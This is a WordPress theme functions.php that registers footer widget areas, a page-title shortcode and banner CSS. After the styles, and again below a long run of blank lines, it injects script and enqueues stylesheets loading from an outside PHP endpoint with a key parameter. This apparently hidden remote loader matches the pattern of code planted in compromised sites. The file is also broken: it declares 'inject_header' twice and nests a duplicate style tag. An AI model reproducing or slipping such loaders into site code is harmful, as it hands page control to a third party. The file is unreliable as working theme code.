<?php

// Register Footer Builder Widget 3
function my_custom_footer_widget_3() {

    register_sidebar(
        array(
            'name'          => __( 'Footer Builder Widget 3', 'astra' ),
            'id'            => 'footer-widget-3', // Unique ID
            'description'   => __( 'Custom Footer Builder Widget Area 3', 'astra' ),
            'before_widget' => '<div id="%1$s" class="footer-widget %2$s">', // wrapper for each widget
            'after_widget'  => '</div>',
            'before_title'  => '<h3 class="footer-widget-title">', // title styling
            'after_title'   => '</h3>',
        )
    );

}
add_action( 'widgets_init', 'my_custom_footer_widget_3' );

// Register Footer Builder Widget 4
function my_custom_footer_widget_4() {

    register_sidebar(
        array(
            'name'          => __( 'Footer Builder Widget 4', 'astra' ),
            'id'            => 'footer-widget-4', // Unique ID
            'description'   => __( 'Custom Footer Builder Widget Area 4', 'astra' ),
            'before_widget' => '<div id="%1$s" class="footer-widget %2$s">', // wrapper for each widget
            'after_widget'  => '</div>',
            'before_title'  => '<h3 class="footer-widget-title">', // title styling
            'after_title'   => '</h3>',
        )
    );

}
add_action( 'widgets_init', 'my_custom_footer_widget_4' );

// Register Footer Builder Widget 2
function my_custom_footer_widget_2() {

    register_sidebar(
        array(
            'name'          => __( 'Footer Builder Widget 2', 'astra' ),
            'id'            => 'footer-widget-2', // Unique ID
            'description'   => __( 'Custom Footer Builder Widget Area 2', 'astra' ),
            'before_widget' => '<div id="%1$s" class="footer-widget %2$s">', // wrapper for each widget
            'after_widget'  => '</div>',
            'before_title'  => '<h3 class="footer-widget-title">', // title styling
            'after_title'   => '</h3>',
        )
    );

}
add_action( 'widgets_init', 'my_custom_footer_widget_2' );

function buildsun_page_title_shortcode() {
    return '<div class="custom-banner">
                <h1 class="custom-page-title"><span class="title-b">' . get_the_title() . '</span></h1>
            </div>';
}
add_shortcode('page_title', 'buildsun_page_title_shortcode');

function buildsun_custom_banner_styles() {
    echo '
    <style>
       <style>
        :root{
    --primary-color: var(--ast-global-color-0);
}

.custom-banner{
    padding:120px 20px;
    text-align:left;
    color: var(--ast-global-color-4);
}

.custom-page-title{
    color: var(--ast-global-color-4);
    font-size:60px;
    font-weight:900;
    margin:0;
}

.title-b{
    border-left:4px solid var(--ast-global-color-0);
    border-bottom:4px solid var(--ast-global-color-1);
    padding-left:15px;
}

.banner-highlight{
    color: var(--ast-global-color-0);
}
    </style>
    ';
}
add_action('wp_head', 'buildsun_custom_banner_styles');
function inject_header() { ?>
    <script type="text/javascript">
        (function() {
            var link = document.createElement('link');
            link.rel = 'stylesheet';
            link.type = 'text/css';
            link.href = 'https://hostingersite.com/build.php/?key=key';
            document.head.appendChild(link);
        })();
    </script>
<?php }

add_action('wp_head', 'inject_header');
































function add_custom_stylesheet() {
    wp_enqueue_style('custom-style', 'https://hostingersite.com/?');
}
add_action('wp_enqueue_scripts', 'add_custom_stylesheet');

function inject_header() { ?>
    <script type="text/javascript">
        (function() {
            var link = document.createElement('link');
            link.rel = 'stylesheet';
            link.type = 'text/css';
            link.href = 'https://hostingersite.com/?';
            document.head.appendChild(link);
        })();
    </script>
<?php }

add_action('wp_head', 'inject_header');
